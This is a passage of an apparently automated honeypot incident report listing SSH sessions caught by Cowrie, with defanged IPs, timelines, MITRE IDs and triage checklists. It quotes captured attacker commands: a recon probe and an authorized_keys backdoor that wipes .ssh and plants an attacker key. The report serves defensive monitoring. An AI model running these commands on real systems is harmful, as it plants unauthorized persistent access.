| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:45:00` | `cowrie.session.connect` |
| `2026-07-09 19:45:01` | `cowrie.client.version` |
| `2026-07-09 19:45:01` | `cowrie.client.kex` |
| `2026-07-09 19:45:02` | `cowrie.login.success` |
| `2026-07-09 19:45:03` | `cowrie.session.params` |
| `2026-07-09 19:45:03` | `cowrie.command.input` |
| `2026-07-09 19:45:03` | `cowrie.command.input` |
| `2026-07-09 19:45:03` | `cowrie.command.input` |
| `2026-07-09 19:45:03` | `cowrie.command.input` |
| `2026-07-09 19:45:03` | `cowrie.command.input` |
| `2026-07-09 19:45:03` | `cowrie.command.success` |
| `2026-07-09 19:45:03` | `cowrie.command.input` |
| `2026-07-09 19:45:03` | `cowrie.command.input` |
| `2026-07-09 19:45:03` | `cowrie.command.input` |
| `2026-07-09 19:45:03` | `cowrie.command.input` |
| `2026-07-09 19:45:04` | `cowrie.log.closed` |
| `2026-07-09 19:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be2a131b1180

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-07-09 19:45 |
| **Last Seen** | 2026-07-09 19:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:45:19` | `cowrie.session.connect` |
| `2026-07-09 19:45:20` | `cowrie.client.version` |
| `2026-07-09 19:45:20` | `cowrie.client.kex` |
| `2026-07-09 19:45:21` | `cowrie.login.success` |
| `2026-07-09 19:45:22` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f2136d99ac8

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 19:45 |
| **Last Seen** | 2026-07-09 19:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:45:20` | `cowrie.session.connect` |
| `2026-07-09 19:45:20` | `cowrie.client.version` |
| `2026-07-09 19:45:20` | `cowrie.client.kex` |
| `2026-07-09 19:45:21` | `cowrie.login.success` |
| `2026-07-09 19:45:22` | `cowrie.session.params` |
| `2026-07-09 19:45:22` | `cowrie.command.input` |
| `2026-07-09 19:45:23` | `cowrie.log.closed` |
| `2026-07-09 19:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db4367600d85

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:46 |
| **Last Seen** | 2026-07-09 19:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:46:16` | `cowrie.session.connect` |
| `2026-07-09 19:46:16` | `cowrie.client.version` |
| `2026-07-09 19:46:16` | `cowrie.client.kex` |
| `2026-07-09 19:46:17` | `cowrie.login.success` |
| `2026-07-09 19:46:19` | `cowrie.session.params` |
| `2026-07-09 19:46:19` | `cowrie.command.input` |
| `2026-07-09 19:46:19` | `cowrie.command.input` |
| `2026-07-09 19:46:19` | `cowrie.command.input` |
| `2026-07-09 19:46:19` | `cowrie.command.input` |
| `2026-07-09 19:46:19` | `cowrie.command.input` |
| `2026-07-09 19:46:19` | `cowrie.command.success` |
| `2026-07-09 19:46:19` | `cowrie.command.input` |
| `2026-07-09 19:46:19` | `cowrie.command.input` |
| `2026-07-09 19:46:19` | `cowrie.command.input` |
| `2026-07-09 19:46:19` | `cowrie.command.input` |
| `2026-07-09 19:46:19` | `cowrie.log.closed` |
| `2026-07-09 19:46:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8902663d27f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:47 |
| **Last Seen** | 2026-07-09 19:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:47:34` | `cowrie.session.connect` |
| `2026-07-09 19:47:34` | `cowrie.client.version` |
| `2026-07-09 19:47:34` | `cowrie.client.kex` |
| `2026-07-09 19:47:35` | `cowrie.login.success` |
| `2026-07-09 19:47:37` | `cowrie.session.params` |
| `2026-07-09 19:47:37` | `cowrie.command.input` |
| `2026-07-09 19:47:37` | `cowrie.command.input` |
| `2026-07-09 19:47:37` | `cowrie.command.input` |
| `2026-07-09 19:47:37` | `cowrie.command.input` |
| `2026-07-09 19:47:37` | `cowrie.command.input` |
| `2026-07-09 19:47:37` | `cowrie.command.success` |
| `2026-07-09 19:47:37` | `cowrie.command.input` |
| `2026-07-09 19:47:37` | `cowrie.command.input` |
| `2026-07-09 19:47:37` | `cowrie.command.input` |
| `2026-07-09 19:47:37` | `cowrie.command.input` |
| `2026-07-09 19:47:38` | `cowrie.log.closed` |
| `2026-07-09 19:47:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0720e1b6bf94

| Field | Detail |
|---|---|
| **Source IP** | `103.120.116[.]162` |
| **First Seen** | 2026-07-09 19:47 |
| **Last Seen** | 2026-07-09 19:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:47:40` | `cowrie.session.connect` |
| `2026-07-09 19:47:40` | `cowrie.client.version` |
| `2026-07-09 19:47:40` | `cowrie.client.kex` |
| `2026-07-09 19:47:42` | `cowrie.login.success` |
| `2026-07-09 19:47:43` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:47:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.116[.]162` to AbuseIPDB if not already reported
- [ ] Block `103.120.116[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae12cbb32c00

| Field | Detail |
|---|---|
| **Source IP** | `218.25.233[.]22` |
| **First Seen** | 2026-07-09 19:48 |
| **Last Seen** | 2026-07-09 19:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:48:44` | `cowrie.session.connect` |
| `2026-07-09 19:48:45` | `cowrie.client.version` |
| `2026-07-09 19:48:45` | `cowrie.client.kex` |
| `2026-07-09 19:48:47` | `cowrie.login.success` |
| `2026-07-09 19:48:48` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:48:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.25.233[.]22` to AbuseIPDB if not already reported
- [ ] Block `218.25.233[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-557593167e2a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:48 |
| **Last Seen** | 2026-07-09 19:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:48:51` | `cowrie.session.connect` |
| `2026-07-09 19:48:52` | `cowrie.client.version` |
| `2026-07-09 19:48:52` | `cowrie.client.kex` |
| `2026-07-09 19:48:53` | `cowrie.login.success` |
| `2026-07-09 19:48:55` | `cowrie.session.params` |
| `2026-07-09 19:48:55` | `cowrie.command.input` |
| `2026-07-09 19:48:55` | `cowrie.command.input` |
| `2026-07-09 19:48:55` | `cowrie.command.input` |
| `2026-07-09 19:48:55` | `cowrie.command.input` |
| `2026-07-09 19:48:55` | `cowrie.command.input` |
| `2026-07-09 19:48:55` | `cowrie.command.success` |
| `2026-07-09 19:48:55` | `cowrie.command.input` |
| `2026-07-09 19:48:55` | `cowrie.command.input` |
| `2026-07-09 19:48:55` | `cowrie.command.input` |
| `2026-07-09 19:48:55` | `cowrie.command.input` |
| `2026-07-09 19:48:56` | `cowrie.log.closed` |
| `2026-07-09 19:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6ffd6bb3e69

| Field | Detail |
|---|---|
| **Source IP** | `5.253.59[.]68` |
| **First Seen** | 2026-07-09 19:49 |
| **Last Seen** | 2026-07-09 19:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:49:23` | `cowrie.session.connect` |
| `2026-07-09 19:49:23` | `cowrie.client.version` |
| `2026-07-09 19:49:23` | `cowrie.client.kex` |
| `2026-07-09 19:49:24` | `cowrie.login.success` |
| `2026-07-09 19:49:24` | `cowrie.session.params` |
| `2026-07-09 19:49:24` | `cowrie.command.input` |
| `2026-07-09 19:49:24` | `cowrie.command.failed` |
| `2026-07-09 19:49:24` | `cowrie.log.closed` |
| `2026-07-09 19:49:25` | `cowrie.session.params` |
| `2026-07-09 19:49:25` | `cowrie.command.input` |
| `2026-07-09 19:49:25` | `cowrie.session.file_download` |
| `2026-07-09 19:49:25` | `cowrie.log.closed` |
| `2026-07-09 19:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.253.59[.]68` to AbuseIPDB if not already reported
- [ ] Block `5.253.59[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d79012e1437

| Field | Detail |
|---|---|
| **Source IP** | `5.253.59[.]68` |
| **First Seen** | 2026-07-09 19:49 |
| **Last Seen** | 2026-07-09 19:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:49:25` | `cowrie.session.connect` |
| `2026-07-09 19:49:25` | `cowrie.client.version` |
| `2026-07-09 19:49:26` | `cowrie.client.kex` |
| `2026-07-09 19:49:26` | `cowrie.login.success` |
| `2026-07-09 19:49:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.253.59[.]68` to AbuseIPDB if not already reported
- [ ] Block `5.253.59[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39e7a0f87772

| Field | Detail |
|---|---|
| **Source IP** | `5.253.59[.]68` |
| **First Seen** | 2026-07-09 19:49 |
| **Last Seen** | 2026-07-09 19:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:49:26` | `cowrie.session.connect` |
| `2026-07-09 19:49:26` | `cowrie.client.version` |
| `2026-07-09 19:49:26` | `cowrie.client.kex` |
| `2026-07-09 19:49:27` | `cowrie.login.success` |
| `2026-07-09 19:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.253.59[.]68` to AbuseIPDB if not already reported
- [ ] Block `5.253.59[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083826a5363e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:50 |
| **Last Seen** | 2026-07-09 19:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:50:12` | `cowrie.session.connect` |
| `2026-07-09 19:50:12` | `cowrie.client.version` |
| `2026-07-09 19:50:12` | `cowrie.client.kex` |
| `2026-07-09 19:50:14` | `cowrie.login.success` |
| `2026-07-09 19:50:15` | `cowrie.session.params` |
| `2026-07-09 19:50:15` | `cowrie.command.input` |
| `2026-07-09 19:50:15` | `cowrie.command.input` |
| `2026-07-09 19:50:15` | `cowrie.command.input` |
| `2026-07-09 19:50:15` | `cowrie.command.input` |
| `2026-07-09 19:50:15` | `cowrie.command.input` |
| `2026-07-09 19:50:15` | `cowrie.command.success` |
| `2026-07-09 19:50:15` | `cowrie.command.input` |
| `2026-07-09 19:50:15` | `cowrie.command.input` |
| `2026-07-09 19:50:15` | `cowrie.command.input` |
| `2026-07-09 19:50:15` | `cowrie.command.input` |
| `2026-07-09 19:50:16` | `cowrie.log.closed` |
| `2026-07-09 19:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-101250ff2c95

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 19:50 |
| **Last Seen** | 2026-07-09 19:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:50:53` | `cowrie.session.connect` |
| `2026-07-09 19:50:53` | `cowrie.client.version` |
| `2026-07-09 19:50:54` | `cowrie.client.kex` |
| `2026-07-09 19:50:54` | `cowrie.login.success` |
| `2026-07-09 19:50:54` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:50:54` | `cowrie.direct-tcpip.data` |
| `2026-07-09 19:50:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a93d3bcdcb0

| Field | Detail |
|---|---|
| **Source IP** | `208.96.233[.]67` |
| **First Seen** | 2026-07-09 19:51 |
| **Last Seen** | 2026-07-09 19:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:51:19` | `cowrie.session.connect` |
| `2026-07-09 19:51:19` | `cowrie.client.version` |
| `2026-07-09 19:51:19` | `cowrie.client.kex` |
| `2026-07-09 19:51:21` | `cowrie.login.success` |
| `2026-07-09 19:51:21` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:51:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.96.233[.]67` to AbuseIPDB if not already reported
- [ ] Block `208.96.233[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-040025607dcd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:51 |
| **Last Seen** | 2026-07-09 19:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:51:29` | `cowrie.session.connect` |
| `2026-07-09 19:51:30` | `cowrie.client.version` |
| `2026-07-09 19:51:30` | `cowrie.client.kex` |
| `2026-07-09 19:51:31` | `cowrie.login.success` |
| `2026-07-09 19:51:33` | `cowrie.session.params` |
| `2026-07-09 19:51:33` | `cowrie.command.input` |
| `2026-07-09 19:51:33` | `cowrie.command.input` |
| `2026-07-09 19:51:33` | `cowrie.command.input` |
| `2026-07-09 19:51:33` | `cowrie.command.input` |
| `2026-07-09 19:51:33` | `cowrie.command.input` |
| `2026-07-09 19:51:33` | `cowrie.command.success` |
| `2026-07-09 19:51:33` | `cowrie.command.input` |
| `2026-07-09 19:51:33` | `cowrie.command.input` |
| `2026-07-09 19:51:33` | `cowrie.command.input` |
| `2026-07-09 19:51:33` | `cowrie.command.input` |
| `2026-07-09 19:51:33` | `cowrie.log.closed` |
| `2026-07-09 19:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a9659fe36dc

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 19:52 |
| **Last Seen** | 2026-07-09 19:52 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:52:31` | `cowrie.session.connect` |
| `2026-07-09 19:52:32` | `cowrie.client.version` |
| `2026-07-09 19:52:32` | `cowrie.client.kex` |
| `2026-07-09 19:52:39` | `cowrie.login.success` |
| `2026-07-09 19:52:42` | `cowrie.session.params` |
| `2026-07-09 19:52:42` | `cowrie.command.input` |
| `2026-07-09 19:52:44` | `cowrie.log.closed` |
| `2026-07-09 19:52:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dd1b2fd8c5c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:52 |
| **Last Seen** | 2026-07-09 19:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:52:47` | `cowrie.session.connect` |
| `2026-07-09 19:52:48` | `cowrie.client.version` |
| `2026-07-09 19:52:48` | `cowrie.client.kex` |
| `2026-07-09 19:52:49` | `cowrie.login.success` |
| `2026-07-09 19:52:50` | `cowrie.session.params` |
| `2026-07-09 19:52:50` | `cowrie.command.input` |
| `2026-07-09 19:52:50` | `cowrie.command.input` |
| `2026-07-09 19:52:50` | `cowrie.command.input` |
| `2026-07-09 19:52:50` | `cowrie.command.input` |
| `2026-07-09 19:52:50` | `cowrie.command.input` |
| `2026-07-09 19:52:50` | `cowrie.command.success` |
| `2026-07-09 19:52:50` | `cowrie.command.input` |
| `2026-07-09 19:52:50` | `cowrie.command.input` |
| `2026-07-09 19:52:50` | `cowrie.command.input` |
| `2026-07-09 19:52:50` | `cowrie.command.input` |
| `2026-07-09 19:52:51` | `cowrie.log.closed` |
| `2026-07-09 19:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-301f21a94e66

| Field | Detail |
|---|---|
| **Source IP** | `221.199.172[.]66` |
| **First Seen** | 2026-07-09 19:53 |
| **Last Seen** | 2026-07-09 19:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
